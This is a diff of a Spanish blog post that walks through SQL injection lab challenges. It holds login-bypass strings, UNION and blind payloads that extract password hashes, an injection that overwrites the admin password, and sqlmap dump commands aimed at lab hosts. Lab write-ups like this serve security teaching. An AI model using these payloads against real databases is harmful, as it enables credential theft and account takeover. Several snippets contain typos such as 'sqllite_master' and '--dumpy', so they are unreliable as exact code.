@@ -13,17 +13,22 @@ tags:
 
 Los ataques de inyección SQL es una técnica donde los atacantes pueden ejecutar peticiones maliciosas para poder ganar acceso en un panel de inicio de sesión o para obtener información de una base de dato sin tener acceso a la misma.
 
-```php
+<div style="text-align:center;">
+  <pre><code>
 $query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"
-```
+  </pre></code>
+</div>
+
 
 Vemos que estamos haciendo una consulta donde estamos seleccionando todos los usuarios de la tabla *users* para obtener su usuario y su password.
 
 Si el atacante modifica dicha consulta de la manera que si cambia la parte de `$_POST["user"]` por `'OR 1=1 --` encontrará un exploit donde se ganará acceso ya que en SQL `1=1` es algo que siempre va a ser verdad y `--` (doble guion) comenta todo lo que lo precede, es decir, el campo password se comenta y no se tiene en cuenta.
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SELECT * FROM users WHERE username= '' OR 1=1 -- AND password= ''
-```
+  </pre></code>
+</div>
 
 Como vemos, el campo password se ha puesto de un color diferente debido a que está comentado.
 
@@ -33,11 +38,12 @@ Lo que hace la consulta anterior es devolver todos los usuarios de la tabla *use
 
 Cuando hacemos un logueo, la aplicación lleva a cabo la siguiente consulta:
 
-```sql
-	SELECT uid, name, profileID, salary, passportNr, email, nickName, password
-	FROM users
-		WHERE profileID =10 AND password 'ce44iqns...'
-```
+<div style="text-align:center;">
+  <pre><code>
+	SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users
+	WHERE profileID =10 AND password 'ce44iqns...'
+  </pre></code>
+</div>
 
 Como vemos en este ejemplo de consulta, vemos que el campo profileID acepta valores / números enteros `profileID =10`, si no hay un tratamiento de esta condición podemos evadir la seguridad haciendo uso de una condición lógica como `1 or 1=1 --`. 
 
@@ -45,11 +51,13 @@ Como vemos en este ejemplo de consulta, vemos que el campo profileID acepta valo
 
 Est desafío presenta la misma consulta a la hora de realizar un logueo.
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 	SELECT uid, name, profileID, salary, passportNr, email, nickName, password
 	FROM users 
 		WHERE profileID ='10' AND password 'ce44iqns...'
-```
+  </pre></code>
+</div>
 
 Con la diferencia que ahora el campo `profileID='10'` no acepta valores numéricos, si no que es una cadena de caracteres.
 
@@ -59,21 +67,25 @@ Para poder evadir la seguridad en este caso, también podemos hacer uso de una c
 
 Seguimos teniendo la misma consulta, pero ahora no podemos evadir la seguridad de la base de datos inyectando una consulta maliciosa a la aplicación vía login.
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 	SELECT uid, name, profileID, salary, passportNr, email, nickName, password 
 	FROM users 
 		WHERE profileID ='10' AND password 'ce44iqns...'
-```
+	</pre></code>
+</div>
+
 
 Ya que se ha implementado un control del lado del cliente (client-side):
 
-```jsx
+<div style="text-align:left;">
+  <pre><code>
 functionvalidateform() {
 	var profileID = document.inputForm.profileID.value;
 	var password = document.inputForm.password.value;
 	
-  if (/^[a-zA-Z0-9]*$/.test(profileID) == false || 
-			/^[a-zA-Z0-9]*$/.test(password) == false) {
+  if (/^[a-zA-Z0-9]*\$/.test(profileID) == false || 
+			/^[a-zA-Z0-9]*\$/.test(password) == false) {
 		alert("The input fields cannot contain special characters");
 	  return false;
 	}
@@ -82,7 +94,8 @@ functionvalidateform() {
     return false;
   }
 }
-```
+  </pre></code>
+</div>
 
 Podemos leer este código y vemos que los campo *profileID* y *password* aceptan caracteres desde [a-Z] hasta [0-9].
 
@@ -90,7 +103,7 @@ Es decir, el control desde el cliente solo mejora la experiencia de usuario pero
 
 Mediante el uso de la herramienta BurpSuite podemos evadir la validación que se realiza en el lado del cliente.
 
-### **SQL Injection 3: URL Injection**
+### SQL Injection 3: URL Injection
 
 Las URL injection se basan en peticiones **GET**  cuando se envía la petición de login.
 
@@ -110,7 +123,7 @@ Podemos o eliminar/desactivar el código JavaScript de validación o mediante Bu
     <img src="../assets/images/Labs/IntroSQLi/Untitled 1.png" alt="Untitled" onclick="openModal(this.src)" />
 </div>
 
-### **SQL Injection 5: UPDATE Statement**
+### SQL Injection 5: UPDATE Statement
 
 Si realizamos una inyección SQL cuando se realizar una consulta *UPDATE* el daño será más grave debido a que nos permitiría realizar cambios en la base de datos.
 
@@ -130,14 +143,17 @@ Si el nombre de las columnas que aparecen no es el correcto, al realizar la inye
 
 Si los campos se actualizan podemos intentar identificar que base de datos se está usando, lo podemos hacer enviando un payload malicioso. Esto lo podemos para bases de datos MySQL, MSSQL, Oracle y SQLite:
 
-```sql
+<div style="text-align:left;">
+  <pre><code>
 			# MySQL and MSSQL*
 			',nickName=@@version,email='
 			# For Oracle*
 			',nickName=(SELECT banner FROM v$version),email='
 			# For SQLite*
 			',nickName=sqlite_version(),email='
-```
+  </pre></code>
+</div>
+
 
 Mediante esto vamos a obtener la versión de la misma.
 
@@ -147,9 +163,12 @@ Podemos enumerar la base de datos extrayendo todas las tablas de la misma.
 
 Vamos a realizar una subconsulta donde haremos uso de la función `group_concat()` que se utiliza para volcar todas las tablas simultáneamente, todo esto lo colocaremos en el campo *nickName* de la consulta:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 ',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
-```
+  </pre></code>
+</div>
+
 
 Como resultado, tenemos que obtenemos el nombre de la única tabla que existe en la base de datos:
 
@@ -159,9 +178,11 @@ Como resultado, tenemos que obtenemos el nombre de la única tabla que existe en
 
 Ahora podemos obtener todos las columnas que componen a dicha tabla:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name = 'usertable'),email='
-```
+  </pre></code>
+</div>
 
 Esta consulta nos devuelve todos las columnas de la tabla usertable:
 
@@ -173,10 +194,12 @@ Conociendo el nombre de las columnas, podemos obtener la información que querem
 
 Por ejemplo, si queremos obtener el profileID ,name y password de los usuarios podemos ejecutar la siguiente consulta:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 ',nickname = (SELECT group_concat(profileID || "," || name || "," ||
 	password || ":") FROM usertable), email='
-```
+ </pre></code>
+</div>
 
 Resultado de la consulta:
 
@@ -188,9 +211,12 @@ Como vemos las contraseñas están en hasheadas, con la herramienta hash-identif
 
 Finalmente podemos actualizar la contraseña del admin a la que queramos mediante:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 ', password='<contraseña_hasheada>' WHERE name='Admin'-- -
-```
+  </pre></code>
+</div>
+
 
 # Vulnerable Startup
 
@@ -223,15 +249,21 @@ Podemos dumpear las contraseñas mediante la UNION basada en SQL injection, solo
 
 Esto lo podemos saber si mandamos una consulta de la manera:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SELECT id, username FROM users WHERE username='" + username + "' AND password= '" + password + "'
-```
+  </pre></code>
+</div>
+
 
 Si no conocemos el número de columnas, primero tendremos que enumerar el número de columnas inyectando consultas de la manera:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 1' UNION SELECT NULL -- -
-```
+  </pre></code>
+</div>
+
 
 Poniendo tantos NULL como tablas creamos que debe de haber.
 
@@ -247,15 +279,21 @@ Mediante el uso de [PayloadsAllTheThings](https://github.com/swisskyrepo/Payload
 
 Como sabemos que el nombre de la tabla es *users* y tenemos la columna *password*, podemos hacer:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 ' UNION SELECT 1, password FROM users-- -
-```
+  </pre></code>
+</div>
+
 
 Si hacemos uso de group_concat() podemos obtener todas las passwords a la vez.
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 ' UNION SELECT 1, group_concat(password) FROM users-- -
-```
+  </pre></code>
+</div>
+
 
 <div style="text-align: center; ">
     <img src="../assets/images/Labs/IntroSQLi/Untitled 9.png" alt="Untitled" onclick="openModal(this.src)" />
@@ -275,15 +313,18 @@ Para poder mandar peticiones de verdadero/falso preguntando a la base de datos s
 
 Para conseguir esto, vamos a hacer uso de la función:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SUBSTR(string, <start>, <length>)
-```
+  </pre></code>
+</div>
 
 Donde *string* será la contraseña del admin, *start* será el inicio de la cadena y *length* será la longitud.
 
 Un ejemplo:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 -- Changing start
 SUBSTR("THM{Blind}", 1,1) = T
 SUBSTR("THM{Blind}", 2,1) = H
@@ -291,45 +332,59 @@ SUBSTR("THM{Blind}", 3,1) = M
 
 -- Changing length
 SUBSTR("THM{Blind}", 1,3) = THM
-```
+	</pre></code>
+</div>
 
 A continuación vamos a introducir la contraseña del admin como una cadena en la función `SUBSTR`.
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 (SELECT password FROM users LIMIT 0,1)
-```
+  </pre></code>
+</div>
 
 Lo que hace `LIMIT` es limitar la cantidad de datos devueltos por `SELECT` .
 
 Quedando de la manera:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SUBSTR((SELECT password FROM users LIMIT 0,1)1,1)
-```
+  </pre></code>
+</div>
+
 
 Ahora vamos a necesitar realizar la comparación entre caracteres para ver si es o no, pero como las contraseñas pueden tener mayúsculas y minúsculas vamos a traducirlas a hexadecimal.
 
-```
+<div style="text-align:center;">
+  <pre><code>
 SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'
-```
+  </pre></code>
+</div>
 
 Siendo ‘t’ (0x74) y ‘T’(0x54).
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
-```
+  </pre></code>
+</div>
 
 Ahora hacemos uso de `CAST` para convertir la representación hexadecimal a un tipo de datos de texto en SQLite, además le añadimos los dos guiones para comentar el campo de la contraseña:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
-```
+  </pre></code>
+</div>
 
 Siendo esta la petición que finalmente hará la base de datos:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
-```
+  </pre></code>
+</div>
 
 Si la aplicación nos devuelve un redirección 302, significa que hemos encontrado el primer carácter de la contraseña. 
 
@@ -337,9 +392,11 @@ Esto es muy tedioso ya que deberíamos de ir carácter a carácter, por tanto, v
 
 También podemos hacer uso de la herramienta externa `sqlmap` para llevar a cabo estos ataques con los parámetros:
 
-```bash
+<div style="text-align:center;">
+  <pre><code>
 sqlmap -u http://MACHINE_IP:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dumpy
-```
+  </pre></code>
+</div>
 
 <div style="text-align: center; ">
     <img src="../assets/images/Labs/IntroSQLi/Untitled 10.png" alt="Untitled" onclick="openModal(this.src)" />
@@ -357,9 +414,12 @@ Aquí entran las *notes* que son una función donde se pueden añadir nuevas not
 
 Luego el usuario introduce cada parámetro en la consulta.
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 INSERT INTO notes (username, title, note) VALUES (?,?,?)
-```
+  </pre></code>
+</div>
+
 
 Estas consultas hace que la base de datos pueda diferenciar entre código y datos, independientemente la entrada de los datos.
 
@@ -367,9 +427,12 @@ Aunque se hagan uso de consultas parametrizadas, el servidor seguirá aceptando 
 
 Sin embargo, la consulta que obtiene todas la notas que pertenece a un usuario no hace uso de consultas parametrizadas, por tanto, se puede concatenar el nombre de usuario directamente en la consulta, haciéndola vulnerable a SQL injection.
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SELECT title, note FROM notes	WHERE name = '" + nombre de usuario + "'
-```
+  </pre></code>
+</div>
+
 
 Esto significa que si añadimos un usuario malicioso, todo estará normal hasta que el usuario navegue a la página de las notas.
 
@@ -379,17 +442,23 @@ Esto significa que si añadimos un usuario malicioso, todo estará normal hasta 
 
 Podemos crear un usuario malicioso mediante `' UNION SELECT 1,2'` , donde la aplicación realizará la siguiente consulta:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SELECT title, note FROM notes	WHERE name='" UNION SELECT 1,2"'
-```
+  </pre></code>
+</div>
+
 
 Con este conocimiento, podemos explotar la base de datos para obtener todas las tablas de la misma y buscar información.
 
 Lo podemos hacer como el ejemplo anterior, donde nos logueamos con un usuario malicioso, de la manera:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 'UNION SELECT 1,group_concat(tlb_name) FROM sqllite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%''
-```
+  </pre></code>
+</div>
+
 
 Para automatizar este tipo de ataque podemos hacer uso de la herramienta `sqlmap` , pero un ataque estándar fallará.
 
@@ -401,10 +470,13 @@ La inyección ocurre en el registro del usuario, pero la función vulnerable se 
 
 Código en `sqlmap` para explotar la vulnerabilidad:
 
-```bash
+<div style="text-align:center;">
+  <pre><code>
 sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" 
 --second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
-```
+  </pre></code>
+</div>
+
 
 ## Change Password
 
@@ -418,23 +490,32 @@ El diseñador de la base de datos ha puesto un menú de perfil que contiene un *
 
 Podemos ganar acceso haciendo `admin' -- -` ya que el diseñador al pensar que el usuario es correcto y seguro lo concatena en la consulta SQL, en vez de usar un *placeholder* como hace con la password:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 UPDATE users SET password = ? WHERE username = '" + username + "'
-```
+  </pre></code>
+</div>
+
 
 Después de iniciar sesión como un usuario malicioso, podemos actualizar la contraseña del usuario para poder ‘activar’ la vulnerabilidad. 
 
 Cuando cambiamos la contraseña, la aplicación ejecuta dos consultas:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SELECT username, password FROM users WHERE id = ?
-```
+  </pre></code>
+</div>
+
 
 Si la comprobación es correcta, procede a cambiar la contraseña:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 UPDATE users SET password = ? WHERE username = 'admin' -- -'
-```
+  </pre></code>
+</div>
+
 
 Esto se resume que en vez de actualizar la contraseña para  `admin' -- -` , la aplicación actualiza la contraseña para el usuario legítimo *admin*. Ahora podemos acceder a la base de datos con el usuario admin.
 
@@ -448,9 +529,12 @@ Podemos toparnos con una aplicación que tiene un buscador, en este caso de libr
 
 Cada vez que se introduce el titulo de un libro (*title*) en dicho buscador se realiza una petición **GET**, siendo la consulta que se manda:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '"+ title + "%')
-```
+  </pre></code>
+</div>
+
 
 Para explotar esta vulnerabilidad lo único que tenemos que hacer es abusar de la cláusula `LIKE` , por ejemplo, inyectando `') or 1=1-- -` :
 
@@ -472,11 +556,14 @@ Vemos que tenemos el mismo panel de consulta de libros, es decir, se realiza una
 
 Como hemos dicho arriba, la aplicación al pedirle el nombre del libro realiza dos consultas, la primera consulta obtiene el ID del libro y la segunda obtiene toda la información del libro a partir de su ID (la primera consulta), aquí vemos las dos consultas:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)
 if bid:
     query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
-```
+  </pre></code>
+</div>
+
 
 Para llevar a cabo esta vulnerabilidad:
 
@@ -498,9 +585,12 @@ Por tanto, en vez de inyectar el código `' UNION SELECT 'STRING` , podemos inye
 
 Si no limitamos el resultado a 0 filas, no tendremos el output de la cláusula `UNION`, sino que obtendremos el resultado de la cláusula `LIKE`:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 test' UNION SELECT '1'-- -
-```
+  </pre></code>
+</div>
+
 
 Ponemos el campo “test” y vemos lo que nos devuelven las dos consultas que realiza la aplicación:
 
@@ -514,15 +604,22 @@ Gracias a esto, ahora tenemos control total de la segunda consulta, donde podemo
 
 Nuestro objetivo en cuestión es que la segunda consulta sea algo similar a:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
+
 SELECT * FROM book WHERE id = ' ' UNION SELECT 1,2,3,4-- -
-```
+  </pre></code>
+</div>
+
 
 Por tanto, si nos fijamos en la imagen, vemos que la cláusula `LIKE` al hacer uso de  `test' UNION SELECT '1'-- -` nos devuelve un ID, por tanto el código a inyectar quedaría:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 SELECT * FROM book WHERE id = ' ' UNION SELECT '-1' UNION SELECT 1,2,3,4- -
-```
+  </pre></code>
+</div>
+
 
 Tendríamos como resultado:
 
@@ -532,8 +629,11 @@ Tendríamos como resultado:
 
 Ahora podemos hacer:
 
-```sql
+<div style="text-align:center;">
+  <pre><code>
 ' union select '-1''union select 1,group_concat(username),group_concat(password),2 from users-- -
-```
+  </pre></code>
+</div>
+
 
 ---
